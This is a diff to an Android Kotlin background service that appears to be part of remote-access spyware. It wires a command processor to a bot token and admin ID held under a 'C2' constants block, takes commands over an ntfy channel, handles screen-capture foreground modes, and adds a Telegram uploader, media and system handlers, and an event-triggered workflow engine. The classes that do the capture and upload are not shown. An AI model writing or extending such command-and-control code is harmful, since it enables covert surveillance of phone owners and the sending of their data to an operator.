@@ -14,6 +14,10 @@ import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import com.systemlinker.comm.NtfyConnectionManager
 import com.systemlinker.features.CommandProcessor
+import com.systemlinker.features.MediaHandler
+import com.systemlinker.features.SystemHandler
+import com.systemlinker.features.TelegramUploader
+import com.systemlinker.features.workflow.WorkflowEngine
 import kotlinx.coroutines.*
 
 class SystemLinkerService : Service() {
@@ -23,6 +27,8 @@ class SystemLinkerService : Service() {
 
     private lateinit var configStore: ConfigStore
     private lateinit var ntfyManager: NtfyConnectionManager
+    private lateinit var vaultManager: VaultManager
+    private lateinit var workflowEngine: WorkflowEngine
 
     private val fgsStateReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -37,24 +43,52 @@ class SystemLinkerService : Service() {
         }
     }
 
+    private val eventRouterReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            if (intent?.action == "com.systemlinker.EVENT_TRIGGER") {
+                val evType = intent.getStringExtra("event_type") ?: ""
+                val evData = intent.getStringExtra("event_data") ?: ""
+                val signature = "$evType:$evData"
+                
+                serviceScope.launch(Dispatchers.IO) {
+                    val matchingWorkflows = vaultManager.getWorkflowsByTrigger(signature)
+                    for (wfName in matchingWorkflows) {
+                        workflowEngine.executeWorkflow(wfName, false)
+                    }
+                }
+            }
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         ErrorLogger.setupCrashHandler(applicationContext)
 
         configStore = ConfigStore(this)
-        val commandProcessor = CommandProcessor(this, Constants.C2.TELEGRAM_BOT_TOKEN, Constants.C2.TELEGRAM_ADMIN_USER_ID)
+        vaultManager = VaultManager(this)
+
+        val uploader = TelegramUploader(this, configStore.botToken, configStore.targetChatId)
+        val mediaHandler = MediaHandler(this)
+        val systemHandler = SystemHandler(this)
+        workflowEngine = WorkflowEngine(this, uploader, systemHandler, mediaHandler)
+
+        val commandProcessor = CommandProcessor(this, configStore.botToken, configStore.targetChatId)
         ntfyManager = NtfyConnectionManager(this, configStore, commandProcessor)
 
         createNotificationChannel()
 
-        val filter = IntentFilter().apply {
+        val fgsFilter = IntentFilter().apply {
             addAction(Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION)
             addAction(Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION)
         }
+        val routerFilter = IntentFilter("com.systemlinker.EVENT_TRIGGER")
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(fgsStateReceiver, filter, RECEIVER_NOT_EXPORTED)
+            registerReceiver(fgsStateReceiver, fgsFilter, RECEIVER_NOT_EXPORTED)
+            registerReceiver(eventRouterReceiver, routerFilter, RECEIVER_NOT_EXPORTED)
         } else {
-            registerReceiver(fgsStateReceiver, filter)
+            registerReceiver(fgsStateReceiver, fgsFilter)
+            registerReceiver(eventRouterReceiver, routerFilter)
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -98,6 +132,7 @@ class SystemLinkerService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         unregisterReceiver(fgsStateReceiver)
+        unregisterReceiver(eventRouterReceiver)
         serviceScope.cancel()
     }
 
